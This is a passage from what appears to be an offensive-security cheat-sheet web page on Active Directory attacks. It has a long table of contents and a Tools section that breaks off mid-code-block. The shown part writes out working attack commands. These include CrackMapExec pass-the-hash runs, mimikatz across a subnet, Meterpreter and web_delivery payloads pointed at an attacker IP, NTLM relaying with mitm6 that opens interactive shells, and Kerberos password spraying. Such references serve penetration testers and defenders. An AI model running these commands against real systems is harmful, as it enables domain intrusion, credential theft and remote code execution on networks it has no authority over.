          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XXE%20Injection/" class="md-nav__link">
        XML External Entity
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48" >
      
      
      
        <label class="md-nav__link" for="__nav_48" id="__nav_48_label" tabindex="0">
           LEARNING AND SOCIALS
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_48_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_48">
          <span class="md-nav__icon md-icon"></span>
           LEARNING AND SOCIALS
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../_LEARNING_AND_SOCIALS/BOOKS/" class="md-nav__link">
        Books
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../_LEARNING_AND_SOCIALS/TWITTER/" class="md-nav__link">
        Twitter
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../_LEARNING_AND_SOCIALS/YOUTUBE/" class="md-nav__link">
        Youtube
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_49" >
      
      
      
        <label class="md-nav__link" for="__nav_49" id="__nav_49_label" tabindex="0">
           template vuln
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_49_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_49">
          <span class="md-nav__icon md-icon"></span>
           template vuln
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../_template_vuln/" class="md-nav__link">
        Vulnerability Title
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="active-directory-attacks">Active Directory Attacks</h1>
<h2 id="summary">Summary</h2>
<ul>
<li><a href="#active-directory-attacks">Active Directory Attacks</a></li>
<li><a href="#summary">Summary</a></li>
<li><a href="#tools">Tools</a></li>
<li><a href="#kerberos-clock-synchronization">Kerberos Clock Synchronization</a></li>
<li><a href="#active-directory-recon">Active Directory Recon</a><ul>
<li><a href="#using-bloodhound">Using BloodHound</a></li>
<li><a href="#using-powerview">Using PowerView</a></li>
<li><a href="#using-ad-module">Using AD Module</a></li>
</ul>
</li>
<li><a href="#from-cve-to-system-shell-on-dc">From CVE to SYSTEM shell on DC</a><ul>
<li><a href="#ms14-068-checksum-validation">MS14-068 Checksum Validation</a></li>
<li><a href="#zerologon">ZeroLogon</a></li>
<li><a href="#printnightmare">PrintNightmare</a></li>
<li><a href="#samaccountname-spoofing">samAccountName spoofing</a></li>
</ul>
</li>
<li><a href="#open-shares">Open Shares</a></li>
<li><a href="#scf-and-url-file-attack-against-writeable-share">SCF and URL file attack against writeable share</a><ul>
<li><a href="#scf-files">SCF Files</a></li>
<li><a href="#url-files">URL Files</a></li>
<li><a href="#windows-library-files">Windows Library Files</a></li>
<li><a href="#windows-search-connectors-files">Windows Search Connectors Files</a></li>
</ul>
</li>
<li><a href="#passwords-in-sysvol-&amp;-group-policy-preferences">Passwords in SYSVOL &amp; Group Policy Preferences</a></li>
<li><a href="#exploit-group-policy-objects-gpo">Exploit Group Policy Objects GPO</a><ul>
<li><a href="#find-vulnerable-gpo">Find vulnerable GPO</a></li>
<li><a href="#abuse-gpo-with-sharpgpoabuse">Abuse GPO with SharpGPOAbuse</a></li>
<li><a href="#abuse-gpo-with-powergpoabuse">Abuse GPO with PowerGPOAbuse</a></li>
<li><a href="#abuse-gpo-with-pygpoabuse">Abuse GPO with pyGPOAbuse</a></li>
<li><a href="#abuse-gpo-with-powerview">Abuse GPO with PowerView</a></li>
<li><a href="#abuse-gpo-with-standin">Abuse GPO with StandIn</a></li>
</ul>
</li>
<li><a href="#dumping-ad-domain-credentials">Dumping AD Domain Credentials</a><ul>
<li><a href="#using-ndtsutil">Using ndtsutil</a></li>
<li><a href="#using-vshadow">Using Vshadow</a></li>
<li><a href="#using-vssadmin">Using vssadmin</a></li>
<li><a href="#using-diskshadow-a-windows-signed-binary">Using DiskShadow (a Windows signed binary)</a></li>
<li><a href="#using-esentutlexe">Using esentutl.exe</a></li>
<li><a href="#extract-hashes-from-ntdsdit">Extract hashes from ntds.dit</a></li>
<li><a href="#alternatives---modules">Alternatives - modules</a></li>
<li><a href="#using-mimikatz-dcsync">Using Mimikatz DCSync</a></li>
<li><a href="#using-mimikatz-sekurlsa">Using Mimikatz sekurlsa</a></li>
<li><a href="#crack-ntlm-hashes-with-hashcat">Crack NTLM hashes with hashcat</a></li>
<li><a href="#ntds-reversible-encryption">NTDS Reversible Encryption</a></li>
</ul>
</li>
<li><a href="#user-hunting">User Hunting</a></li>
<li><a href="#password-spraying">Password spraying</a><ul>
<li><a href="#kerberos-pre-auth-bruteforcing">Kerberos pre-auth bruteforcing</a></li>
<li><a href="#spray-a-pre-generated-passwords-list">Spray a pre-generated passwords list</a></li>
<li><a href="#spray-passwords-against-the-rdp-service">Spray passwords against the RDP service</a></li>
<li><a href="#badpwdcount-attribute">BadPwdCount attribute</a></li>
</ul>
</li>
<li><a href="#password-in-ad-user-comment">Password in AD User comment</a></li>
<li><a href="#password-of-pre-created-computer-account">Password of Pre-Created Computer Account</a></li>
<li><a href="#reading-laps-password">Reading LAPS Password</a></li>
<li><a href="#reading-gmsa-password">Reading GMSA Password</a></li>
<li><a href="#forging-golden-gmsa">Forging Golden GMSA</a></li>
<li><a href="#kerberos-tickets">Kerberos Tickets</a><ul>
<li><a href="#dump-kerberos-tickets">Dump Kerberos Tickets</a></li>
<li><a href="#replay-kerberos-tickets">Replay Kerberos Tickets</a></li>
<li><a href="#convert-kerberos-tickets">Convert Kerberos Tickets</a></li>
<li><a href="#pass-the-ticket-golden-tickets">Pass-the-Ticket Golden Tickets</a></li>
<li><a href="#using-mimikatz">Using Mimikatz</a></li>
<li><a href="#using-meterpreter">Using Meterpreter</a></li>
<li><a href="#using-a-ticket-on-linux">Using a ticket on Linux</a></li>
<li><a href="#pass-the-ticket-silver-tickets">Pass-the-Ticket Silver Tickets</a></li>
<li><a href="#pass-the-ticket-diamond-tickets">Pass-the-Ticket Diamond Tickets</a></li>
<li><a href="#pass-the-ticket-sapphire-tickets">Pass-the-Ticket Sapphire Tickets</a></li>
</ul>
</li>
<li><a href="#kerberoasting">Kerberoasting</a></li>
<li><a href="#krbasrep-roasting">KRB_AS_REP Roasting</a></li>
<li><a href="#pass-the-hash">Pass-the-Hash</a></li>
<li><a href="#overpass-the-hash-pass-the-key">OverPass-the-Hash (pass the key)</a><ul>
<li><a href="#using-impacket">Using impacket</a></li>
<li><a href="#using-rubeus">Using Rubeus</a></li>
</ul>
</li>
<li><a href="#capturing-and-cracking-net-ntlmv1ntlmv1-hashes">Capturing and cracking Net-NTLMv1/NTLMv1 hashes</a></li>
<li><a href="#capturing-and-cracking-net-ntlmv2ntlmv2-hashes">Capturing and cracking Net-NTLMv2/NTLMv2 hashes</a></li>
<li><a href="#man-in-the-middle-attacks--relaying">Man-in-the-Middle attacks &amp; relaying</a><ul>
<li><a href="#ms08-068-ntlm-reflection">MS08-068 NTLM reflection</a></li>
<li><a href="#smb-signing-disabled-and-ipv4">SMB Signing Disabled and IPv4</a></li>
<li><a href="#smb-signing-disabled-and-ipv6">SMB Signing Disabled and IPv6</a></li>
<li><a href="#drop-the-mic">Drop the MIC</a></li>
<li><a href="#ghost-potato---cve-2019-1384">Ghost Potato - CVE-2019-1384</a></li>
<li><a href="#remotepotato0-dcom-dce-rpc-relay">RemotePotato0 DCOM DCE RPC relay</a></li>
<li><a href="#dns-poisonning---relay-delegation-with-mitm6">DNS Poisonning - Relay delegation with mitm6</a></li>
<li><a href="#relaying-with-webdav-trick">Relaying with WebDav Trick</a></li>
</ul>
</li>
<li><a href="#active-directory-certificate-services">Active Directory Certificate Services</a><ul>
<li><a href="#esc1---misconfigured-certificate-templates">ESC1 - Misconfigured Certificate Templates</a></li>
<li><a href="#esc2---misconfigured-certificate-templates">ESC2 - Misconfigured Certificate Templates</a></li>
<li><a href="#esc3---misconfigured-enrollment-agent-templates">ESC3 - Misconfigured Enrollment Agent Templates</a></li>
<li><a href="#esc4---access-control-vulnerabilities">ESC4 - Access Control Vulnerabilities</a></li>
<li><a href="#esc6---editf_attributesubjectaltname2">ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 </a></li>
<li><a href="#esc7---vulnerable-certificate-authority-access-control">ESC7 - Vulnerable Certificate Authority Access Control</a></li>
<li><a href="#esc8---ad-cs-relay-attack">ESC8 - AD CS Relay Attack</a></li>
<li><a href="#esc9---no-security-extension">ESC9 - No Security Extension</a></li>
<li><a href="#esc11---relaying-ntlm-to-icpr">ESC11 - Relaying NTLM to ICPR</a></li>
<li><a href="#certifried-cve-2022-26923">Certifried CVE-2022-26923</a></li>
<li><a href="#pass-the-certificate">Pass-The-Certificate</a></li>
</ul>
</li>
<li><a href="#active-directory-federation-services">Active Directory Federation Services</a><ul>
<li><a href="#adfs---golden-saml">ADFS - Golden SAML</a></li>
</ul>
</li>
<li><a href="#unpac-the-hash">UnPAC The Hash</a></li>
<li><a href="#shadow-credentials">Shadow Credentials</a></li>
<li><a href="#active-directory-groups">Active Directory Groups</a><ul>
<li><a href="#dangerous-built-in-groups-usage">Dangerous Built-in Groups Usage</a></li>
<li><a href="#abusing-dns-admins-group">Abusing DNS Admins Group</a></li>
<li><a href="#abusing-schema-admins-group">Abusing Schema Admins Group</a></li>
<li><a href="#abusing-backup-operators-group">Abusing Backup Operators Group</a></li>
</ul>
</li>
<li><a href="#abusing-active-directory-aclsaces">Abusing Active Directory ACLs/ACEs</a><ul>
<li><a href="#genericall">GenericAll</a></li>
<li><a href="#genericwrite">GenericWrite</a></li>
<li><a href="#genericwrite-and-remote-connection-manager">GenericWrite and Remote Connection Manager</a></li>
<li><a href="#writedacl">WriteDACL</a></li>
<li><a href="#writeowner">WriteOwner</a></li>
<li><a href="#readlapspassword">ReadLAPSPassword</a></li>
<li><a href="#readgmsapassword">ReadGMSAPassword</a></li>
<li><a href="#forcechangepassword">ForceChangePassword</a></li>
</ul>
</li>
<li><a href="#dcom-exploitation">DCOM Exploitation</a><ul>
<li><a href="#dcom-via-mmc-application-class">DCOM via MMC Application Class</a> </li>
<li><a href="#dcom-via-excel">DCOM via Excel</a></li>
<li><a href="#dcom-via-shellexecute">DCOM via ShellExecute</a></li>
</ul>
</li>
<li><a href="#trust-relationship-between-domains">Trust relationship between domains</a></li>
<li><a href="#child-domain-to-forest-compromise---sid-hijacking">Child Domain to Forest Compromise - SID Hijacking</a></li>
<li><a href="#forest-to-forest-compromise---trust-ticket">Forest to Forest Compromise - Trust Ticket</a></li>
<li><a href="#privileged-access-management-pam-trust">Privileged Access Management (PAM) Trust</a></li>
<li><a href="#kerberos-unconstrained-delegation">Kerberos Unconstrained Delegation</a><ul>
<li><a href="#spoolservice-abuse-with-unconstrained-delegation">SpoolService Abuse with Unconstrained Delegation</a></li>
<li><a href="#ms---efsrpc-abuse-with-unconstrained-delegation">MS-EFSRPC Abuse with Unconstrained Delegation</a></li>
</ul>
</li>
<li><a href="#kerberos-constrained-delegation">Kerberos Constrained Delegation</a></li>
<li><a href="#kerberos-resource-based-constrained-delegation">Kerberos Resource Based Constrained Delegation</a></li>
<li><a href="#kerberos-bronze-bit-attack---cve-2020-17049">Kerberos Bronze Bit Attack - CVE-2020-17049</a></li>
<li><a href="#privexchange-attack">PrivExchange attack</a></li>
<li><a href="#sccm-deployment">SCCM Deployment</a></li>
<li><a href="#sccm-network-access-accounts">SCCM Network Access Accounts</a></li>
<li><a href="#sccm-shares">SCCM Shares</a></li>
<li><a href="#wsus-deployment">WSUS Deployment</a></li>
<li><a href="#rodc---read-only-domain-controller">RODC - Read Only Domain Controller</a><ul>
<li><a href="#rodc-golden-ticket">RODC Golden Ticket</a></li>
<li><a href="#rodc-key-list-attack">RODC Key List Attack</a></li>
<li><a href="#rodc-computer-object">RODC Computer Object</a></li>
</ul>
</li>
<li><a href="#pxe-boot-image-attack">PXE Boot image attack</a></li>
<li><a href="#dsrm-credentials">DSRM Credentials</a></li>
<li><a href="#dns-reconnaissance">DNS Reconnaissance</a></li>
<li><a href="#linux-active-directory">Linux Active Directory</a><ul>
<li><a href="#ccache-ticket-reuse-from-tmp">CCACHE ticket reuse from /tmp</a></li>
<li><a href="#ccache-ticket-reuse-from-keyring">CCACHE ticket reuse from keyring</a></li>
<li><a href="#ccache-ticket-reuse-from-sssd-kcm">CCACHE ticket reuse from SSSD KCM</a></li>
<li><a href="#ccache-ticket-reuse-from-keytab">CCACHE ticket reuse from keytab</a></li>
<li><a href="#extract-accounts-from-etckrb5keytab">Extract accounts from /etc/krb5.keytab</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
<h2 id="tools">Tools</h2>
<ul>
<li><a href="https://github.com/CoreSecurity/impacket">Impacket</a> or the <a href="https://github.com/maaaaz/impacket-examples-windows">Windows version</a></li>
<li><a href="https://github.com/lgandx/Responder">Responder</a></li>
<li><a href="https://github.com/Kevin-Robertson/InveighZero">InveighZero</a></li>
<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></li>
<li><a href="https://github.com/funkandwagnalls/ranger">Ranger</a></li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">AdExplorer</a></li>
<li><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c"># use the latest release, CME is now a binary packaged will all its dependencies</span>
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">root</span><span class="nv">@payload</span><span class="p">$</span> <span class="nb">wget </span><span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">byt3bl33d3r</span><span class="p">/</span><span class="n">CrackMapExec</span><span class="p">/</span><span class="n">releases</span><span class="p">/</span><span class="n">download</span><span class="p">/</span><span class="n">v5</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1dev</span><span class="p">/</span><span class="n">cme-ubuntu-latest</span><span class="p">.</span><span class="n">zip</span>
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c"># execute cme (smb, winrm, mssql, ...)</span>
<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="n">root</span><span class="nv">@payload</span><span class="p">$</span> <span class="n">cme</span> <span class="n">smb</span> <span class="n">-L</span>
<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="n">root</span><span class="nv">@payload</span><span class="p">$</span> <span class="n">cme</span> <span class="n">smb</span> <span class="n">-M</span> <span class="n">name_module</span> <span class="n">-o</span> <span class="n">VAR</span><span class="p">=</span><span class="n">DATA</span>
<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="n">root</span><span class="nv">@payload</span><span class="p">$</span> <span class="n">cme</span> <span class="n">smb</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">100</span> <span class="n">-u</span> <span class="n">Administrator</span> <span class="n">-H</span> <span class="n">5858d47a41e40b40f294b3100bea611f</span> <span class="p">-</span><span class="n">-local-auth</span>
<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="n">root</span><span class="nv">@payload</span><span class="p">$</span> <span class="n">cme</span> <span class="n">smb</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">100</span> <span class="n">-u</span> <span class="n">Administrator</span> <span class="n">-H</span> <span class="n">5858d47a41e40b40f294b3100bea611f</span> <span class="p">-</span><span class="n">-shares</span>
<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="n">root</span><span class="nv">@payload</span><span class="p">$</span> <span class="n">cme</span> <span class="n">smb</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">100</span> <span class="n">-u</span> <span class="n">Administrator</span> <span class="n">-H</span> <span class="s1">&#39;:5858d47a41e40b40f294b3100bea611f&#39;</span> <span class="n">-d</span> <span class="s1">&#39;DOMAIN&#39;</span> <span class="n">-M</span> <span class="n">invoke_sessiongopher</span>
<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="n">root</span><span class="nv">@payload</span><span class="p">$</span> <span class="n">cme</span> <span class="n">smb</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">100</span> <span class="n">-u</span> <span class="n">Administrator</span> <span class="n">-H</span> <span class="n">5858d47a41e40b40f294b3100bea611f</span> <span class="n">-M</span> <span class="n">rdp</span> <span class="n">-o</span> <span class="n">ACTION</span><span class="p">=</span><span class="n">enable</span>
<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="n">root</span><span class="nv">@payload</span><span class="p">$</span> <span class="n">cme</span> <span class="n">smb</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">100</span> <span class="n">-u</span> <span class="n">Administrator</span> <span class="n">-H</span> <span class="n">5858d47a41e40b40f294b3100bea611f</span> <span class="n">-M</span> <span class="n">metinject</span> <span class="n">-o</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">63</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4443</span>
<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="n">root</span><span class="nv">@payload</span><span class="p">$</span> <span class="n">cme</span> <span class="n">smb</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">100</span> <span class="n">-u</span> <span class="n">Administrator</span> <span class="n">-H</span> <span class="s2">&quot;:5858d47a41e40b40f294b3100bea611f&quot;</span> <span class="n">-M</span> <span class="n">web_delivery</span> <span class="n">-o</span> <span class="n">URL</span><span class="p">=</span><span class="s2">&quot;https://IP:PORT/posh-payload&quot;</span>
<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="n">root</span><span class="nv">@payload</span><span class="p">$</span> <span class="n">cme</span> <span class="n">smb</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">100</span> <span class="n">-u</span> <span class="n">Administrator</span> <span class="n">-H</span> <span class="s2">&quot;:5858d47a41e40b40f294b3100bea611f&quot;</span> <span class="p">-</span><span class="n">-exec-method</span> <span class="n">smbexec</span> <span class="n">-X</span> <span class="s1">&#39;whoami&#39;</span>
<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="n">root</span><span class="nv">@payload</span><span class="p">$</span> <span class="n">cme</span> <span class="n">smb</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">0</span><span class="p">/</span><span class="n">24</span> <span class="n">-u</span> <span class="n">user</span> <span class="n">-p</span> <span class="s1">&#39;Password&#39;</span> <span class="p">-</span><span class="n">-local-auth</span> <span class="n">-M</span> <span class="n">mimikatz</span>
<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="n">root</span><span class="nv">@payload</span><span class="p">$</span> <span class="n">cme</span> <span class="n">mimikatz</span> <span class="p">-</span><span class="n">-server</span> <span class="n">http</span> <span class="p">-</span><span class="n">-server-port</span> <span class="n">80</span>
</code></pre></div>
<ul>
<li><a href="https://github.com/fox-it/mitm6.git">Mitm6</a></li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/fox-it/mitm6.git<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>mitm6
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>pip<span class="w"> </span>install<span class="w"> </span>.
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>mitm6<span class="w"> </span>-d<span class="w"> </span>lab.local
<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>ntlmrelayx.py<span class="w"> </span>-wh<span class="w"> </span><span class="m">192</span>.168.218.129<span class="w"> </span>-t<span class="w"> </span>smb://192.168.218.128/<span class="w"> </span>-i
<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="c1"># -wh: Server hosting WPAD file (Attacker’s IP)</span>
<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="c1"># -t: Target (You cannot relay credentials to the same device that you’re spoofing)</span>
<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="c1"># -i: open an interactive shell</span>
<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldaps://lab.local<span class="w"> </span>-wh<span class="w"> </span>attacker-wpad<span class="w"> </span>--delegate-access
</code></pre></div>
<ul>
<li><a href="https://github.com/sense-of-security/ADRecon">ADRecon</a></li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">.\</span><span class="n">ADRecon</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-DomainController</span> <span class="n">MYAD</span><span class="p">.</span><span class="n">net</span> <span class="n">-Credential</span> <span class="n">MYAD</span><span class="p">\</span><span class="n">myuser</span>
</code></pre></div>
<ul>
<li>
<p><a href="https://github.com/hausec/ADAPE-Script">Active Directory Assessment and Privilege Escalation Script</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="p">./</span><span class="n">ADAPE</span><span class="p">.</span><span class="n">ps1</span> 
</code></pre></div>
</li>
<li>
<p><a href="https://github.com/vletoux/pingcastle">Ping Castle</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">pingcastle</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-healthcheck</span> <span class="p">-</span><span class="n">-server</span> <span class="p">&lt;</span><span class="n">DOMAIN_CONTROLLER_IP</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-user</span> <span class="p">&lt;</span><span class="n">USERNAME</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-password</span> <span class="p">&lt;</span><span class="n">PASSWORD</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-advanced-live</span> <span class="p">-</span><span class="n">-nullsession</span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">pingcastle</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-healthcheck</span> <span class="p">-</span><span class="n">-server</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span>
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">pingcastle</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-graph</span> <span class="p">-</span><span class="n">-server</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span>
<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="n">pingcastle</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-scanner</span> <span class="n">scanner_name</span> <span class="p">-</span><span class="n">-server</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span>
<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="n">available</span> <span class="n">scanners</span> <span class="n">are</span><span class="p">:</span><span class="n">aclcheck</span><span class="p">,</span><span class="n">antivirus</span><span class="p">,</span><span class="n">computerversion</span><span class="p">,</span><span class="n">foreignusers</span><span class="p">,</span><span class="n">laps_bitlocker</span><span class="p">,</span><span class="n">localadmin</span><span class="p">,</span><span class="n">nullsession</span><span class="p">,</span><span class="n">nullsession-trust</span><span class="p">,</span><span class="n">oxidbindings</span><span class="p">,</span><span class="n">remote</span><span class="p">,</span><span class="n">share</span><span class="p">,</span><span class="n">smb</span><span class="p">,</span><span class="n">smb3querynetwork</span><span class="p">,</span><span class="n">spooler</span><span class="p">,</span><span class="n">startup</span><span class="p">,</span><span class="n">zerologon</span><span class="p">,</span><span class="n">computers</span><span class="p">,</span><span class="n">users</span>
</code></pre></div>
</li>
<li>
<p><a href="https://github.com/ropnop/kerbrute">Kerbrute</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">./</span><span class="n">kerbrute</span> <span class="n">passwordspray</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">USERS</span><span class="p">.</span><span class="n">TXT</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">PASSWORD</span><span class="p">&gt;</span>
</code></pre></div>
</li>
<li>
<p><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">USER</span> <span class="p">&lt;/</span><span class="n">password</span><span class="p">:</span><span class="n">PASSWORD</span> <span class="p">[/</span><span class="n">enctype</span><span class="p">:</span><span class="n">DES</span><span class="p">|</span><span class="n">RC4</span><span class="p">|</span><span class="n">AES128</span><span class="p">|</span><span class="n">AES256</span><span class="p">]</span> <span class="p">|</span> <span class="p">/</span><span class="n">des</span><span class="p">:</span><span class="n">HASH</span> <span class="p">|</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">HASH</span> <span class="p">|</span> <span class="p">/</span><span class="n">aes128</span><span class="p">:</span><span class="n">HASH</span> <span class="p">|</span> <span class="p">/</span><span class="n">aes256</span><span class="p">:</span><span class="n">HASH</span><span class="p">&gt;</span> <span class="p">[/</span><span class="n">domain</span><span class="p">:</span><span class="n">DOMAIN</span><span class="p">]</span> <span class="p">[/</span><span class="n">dc</span><span class="p">:</span><span class="n">DOMAIN_CONTROLLER</span><span class="p">]</span> <span class="p">[/</span><span class="n">ptt</span><span class="p">]</span> <span class="p">[/</span><span class="n">luid</span><span class="p">]</span>
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">dump</span> <span class="p">[/</span><span class="n">service</span><span class="p">:</span><span class="n">SERVICE</span><span class="p">]</span> <span class="p">[/</span><span class="n">luid</span><span class="p">:</span><span class="n">LOGINID</span><span class="p">]</span>
<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">klist</span> <span class="p">[/</span><span class="n">luid</span><span class="p">:</span><span class="n">LOGINID</span><span class="p">]</span>
<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">[/</span><span class="n">spn</span><span class="p">:</span><span class="s2">&quot;blah/blah&quot;</span><span class="p">]</span> <span class="p">[/</span><span class="n">user</span><span class="p">:</span><span class="n">USER</span><span class="p">]</span> <span class="p">[/</span><span class="n">domain</span><span class="p">:</span><span class="n">DOMAIN</span><span class="p">]</span> <span class="p">[/</span><span class="n">dc</span><span class="p">:</span><span class="n">DOMAIN_CONTROLLER</span><span class="p">]</span> <span class="p">[/</span><span class="n">ou</span><span class="p">:</span><span class="s2">&quot;OU=,...&quot;</span><span class="p">]</span>
</code></pre></div>
</li>
<li>
<p><a href="https://github.com/AutomatedLab/AutomatedLab">AutomatedLab</a>
    <div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">New-LabDefinition</span> <span class="n">-Name</span> <span class="n">GettingStarted</span> <span class="n">-DefaultVirtualizationEngine</span> <span class="n">HyperV</span>
